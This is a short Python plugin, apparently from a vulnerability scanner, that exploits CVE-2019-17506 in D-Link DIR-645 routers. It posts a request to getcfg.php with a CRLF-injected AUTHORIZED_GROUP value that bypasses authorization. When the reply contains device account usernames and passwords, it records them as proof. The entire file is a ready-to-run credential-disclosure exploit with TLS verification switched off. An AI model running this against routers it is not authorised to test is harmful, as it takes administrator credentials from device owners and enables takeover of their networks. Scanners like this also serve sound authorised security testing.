#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'D-Link Dir-645 getcfg.php 账号密码泄露漏洞 CVE-2019-17506',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
        'User-Agent': ua,
        'Content-Type': 'application/x-www-form-urlencoded',
        }
  data = 'SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1'
  target = ''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "uid" in res.text and "name" in res.text and 'password' in res.text and 'usrid' in res.text:
      ret['huixian'] = '账号密码在响应包中：\n'+res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret